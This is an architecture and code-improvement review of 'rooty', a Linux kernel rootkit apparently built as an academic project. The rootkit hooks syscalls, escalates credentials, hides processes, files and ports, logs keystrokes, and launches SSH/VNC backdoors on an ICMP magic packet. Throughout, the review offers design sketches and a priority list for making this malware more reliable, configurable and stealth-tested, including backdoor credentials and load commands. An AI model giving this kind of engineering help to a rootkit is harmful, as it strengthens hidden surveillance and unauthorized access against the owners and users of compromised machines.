# Architecture and Code Organization Improvements

High-level architectural recommendations for the rooty codebase.

---

## 1. Separation of Concerns

### Current Problem

The entire kernel module is implemented across 8 header files included into a single `rooty.c`. This creates a monolithic compilation unit with:
- No interface boundaries
- All symbols in the same scope
- No independent testability
- Name collisions risk (e.g., `AUTH_TOKEN` defined in both `ioctl.h` and `ssh.h`)
- Impossible to build components independently

### Recommended Architecture

Split into well-defined subsystems, each with a clear interface:

```
┌─────────────────────────────────────────────────┐
│                  rooty_main.c                    │
│            (init/exit orchestration)             │
├──────────┬──────────┬───────────┬───────────────┤
│ hook     │ hide     │ net_hide  │ keylogger     │
│ engine   │ (proc/   │ (tcp/udp  │               │
│          │  files)  │  ports)   │               │
├──────────┴──────────┴───────────┴───────────────┤
│              ioctl_dispatch.c                    │
│         (command routing layer)                  │
├──────────────┬──────────────────────────────────┤
│  ssh_daemon  │  vnc_daemon                      │
│  management  │  management                      │
└──────────────┴──────────────────────────────────┘
```

Each subsystem exposes a minimal API:
- `_init()` / `_exit()` lifecycle functions
- Action functions (hide/unhide/start/stop)
- Configuration structures

---

## 2. Hook Engine Abstraction

### Current Problem

`syscall_table.h` mixes three unrelated concerns:
1. Syscall table discovery (IDT parsing)
2. Inline function hooking (push/ret trampoline)
3. Write protection management (CR0 manipulation)
4. Credential manipulation (`root_me`)

### Recommended Design

```c
/* rooty_hook.h — Generic hooking interface */

struct rooty_hook {
    void *target;           /* Original function address */
    void *replacement;      /* Hook function */
    unsigned char orig[16]; /* Saved original bytes */
    size_t patch_size;      /* Size of trampoline */
    struct list_head list;
    spinlock_t lock;
};

int rooty_hook_init(void);     /* Discover syscall table, etc. */
void rooty_hook_exit(void);

int rooty_hook_install(struct rooty_hook *hook);
void rooty_hook_remove(struct rooty_hook *hook);
void rooty_hook_pause(struct rooty_hook *hook);
void rooty_hook_resume(struct rooty_hook *hook);
```

This allows:
- Swapping the hooking backend (inline patch vs. ftrace vs. kprobes) without changing consumers
- Proper locking per-hook
- Clean lifecycle management

---

## 3. Daemon Management Abstraction

### Current Problem

`ssh.h` and `vnc.h` contain nearly identical code for:
- Starting a userspace process via `call_usermodehelper`
- Tracking the PID
- Sending signals to stop the process
- Managing running state

### Recommended Design

```c
/* rooty_daemon.h */

struct rooty_daemon {
    const char *name;
    const char *path;
    char **argv;
    char **envp;
    pid_t pid;
    atomic_t is_running;
    struct task_struct *manager_thread;
};

int rooty_daemon_start(struct rooty_daemon *d);
int rooty_daemon_stop(struct rooty_daemon *d);
bool rooty_daemon_is_running(struct rooty_daemon *d);
```

SSH-specific features (ICMP trigger) would be a thin layer on top:

```c
/* rooty_ssh.c */
static struct rooty_daemon ssh_daemon = {
    .name = "sshd",
    .path = "/sbin/sshd",
    /* ... */
};

/* ICMP netfilter hook only triggers rooty_daemon_start(&ssh_daemon) */
```

---

## 4. Port/Process/File Hiding Unification

### Current Problem

Four copies of port hiding logic (tcp4, tcp6, udp4, udp6), two copies of directory hiding logic (proc, root fs), each with their own linked list and nearly identical hook functions.

### Recommended Design

```c
/* rooty_hide.h */

/* Generic hidden-item list */
struct rooty_hide_list {
    struct list_head entries;
    spinlock_t lock;
};

/* Port hiding */
struct rooty_port_entry {
    struct list_head list;
    unsigned short port;
};

int rooty_port_hide(struct rooty_hide_list *list, unsigned short port);
int rooty_port_unhide(struct rooty_hide_list *list, unsigned short port);
bool rooty_port_is_hidden(struct rooty_hide_list *list, unsigned short port);

/* Process hiding */
struct rooty_proc_entry {
    struct list_head list;
    pid_t pid;
};

/* File hiding */
struct rooty_file_entry {
    struct list_head list;
    char name[NAME_MAX];
};
```

The seq_show hooks become a single parameterized function:

```c
static int rooty_net_seq_show_filter(struct seq_file *seq, void *v,
                                      int (*orig_show)(struct seq_file*, void*),
                                      struct rooty_hide_list *hidden_ports)
{
    /* Single implementation for all 4 protocol variants */
}
```

---

## 5. Configuration Management

### Current Problem

All configuration is hardcoded at compile time:
- `AUTH_TOKEN 0xDEADC0DE`
- `LOG_FILE "/.keylog"`
- `"/sbin/sshd"`, `"/sbin/vncd"`
- SSH port 22, VNC port 5900
- SSH credentials `root`/`test`
- ICMP magic packet format
- Hardcoded username `"jermey"`

### Recommended Design

Use `module_param` for kernel module configuration:

```c
static char *auth_token = "DEADC0DE";
module_param(auth_token, charp, 0);
MODULE_PARM_DESC(auth_token, "Authentication token (hex string)");

static char *log_path = "/.keylog";
module_param(log_path, charp, 0);

static char *sshd_path = "/sbin/sshd";
module_param(sshd_path, charp, 0);
```

Load with: `insmod rooty.ko auth_token=CAFEBABE log_path=/tmp/.log`

For userspace tools, accept command-line arguments or config file.

---

## 6. Concurrency Model

### Current Problem

Zero synchronization anywhere in the codebase:
- Linked lists accessed from multiple contexts without locks
- Global function pointers overwritten without locks
- Shared state between softirq (netfilter), kthreads, and keyboard notifier (interrupt context)
- `volatile` used incorrectly as a synchronization primitive

### Recommended Design

Each subsystem should own a spinlock protecting its mutable state:

```c
struct rooty_hide_ctx {
    struct list_head proc_list;
    struct list_head file_list;
    spinlock_t lock;
};

int rooty_hide_proc(struct rooty_hide_ctx *ctx, pid_t pid)
{
    struct rooty_proc_entry *entry;

    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
    if (!entry)
        return -ENOMEM;

    entry->pid = pid;

    spin_lock(&ctx->lock);
    list_add(&entry->list, &ctx->proc_list);
    spin_unlock(&ctx->lock);

    return 0;
}
```

For the keylogger (interrupt context → kthread):
- Use `spin_lock_irqsave` / `spin_lock_irqrestore` for the buffer
- Or use a lock-free ring buffer (`kfifo`)

---

## 7. Cleanup and Resource Management

### Current Problem

`rooty_init()` initializes multiple subsystems but has no rollback on partial failure. If `init_ssh()` fails, the hooks installed by earlier steps remain active with no way to clean up.

### Recommended Design

Use the kernel's standard error-cleanup pattern:

```c
int rooty_init(void)
{
    int ret;

    ret = rooty_hook_engine_init();
    if (ret) return ret;

    ret = rooty_install_proc_hooks();
    if (ret) goto err_hook_engine;

    ret = rooty_install_net_hooks();
    if (ret) goto err_proc_hooks;

    ret = rooty_keylogger_init();
    if (ret) goto err_net_hooks;

    ret = rooty_ssh_init();
    if (ret) goto err_keylogger;

    return 0;

err_keylogger:
    rooty_keylogger_exit();
err_net_hooks:
    rooty_remove_net_hooks();
err_proc_hooks:
    rooty_remove_proc_hooks();
err_hook_engine:
    rooty_hook_engine_exit();
    return ret;
}
```

`rooty_exit()` should mirror in reverse order (already partially done, but without error checking).

---

## 8. Testing Strategy

For an academic project, adding even minimal testing greatly increases credibility:

### Unit Tests (Userspace)
- Test the ICMP checksum function in `ping.py`
- Test the keymap arrays for correctness (verify all 128 entries)
- Test the ioctl argument parsing

### Integration Tests
- Script that loads the module and verifies hiding works: `insmod rooty.ko && ls / | grep -v rooty.ko`
- Script that verifies port hiding: `hide port 1234, then check /proc/net/tcp`
- Script that verifies process hiding: `hide PID, then check /proc/`

### Static Analysis
- Run `sparse` on kernel code
- Run `cppcheck` on userspace code
- Run `checkpatch.pl` for kernel coding style

---

## Summary of Priority Changes

| Priority | Change | Effort |
|---|---|---|
| **P0** | Fix critical bugs (see BUGS.md) | Low |
| **P0** | Add include guards to all headers | Low |
| **P1** | Move function definitions out of headers | Medium |
| **P1** | Add locking to all shared data structures | Medium |
| **P1** | Fix error handling (IS_ERR, kmalloc, copy_from_user) | Medium |
| **P2** | Unify duplicated code (port hiding, daemon mgmt) | Medium |
| **P2** | Create shared UAPI header | Low |
| **P2** | Improve build system | Low |
| **P3** | Add module_param configuration | Low |
| **P3** | Add kernel version compatibility checks | Medium |
| **P3** | Add testing infrastructure | High |
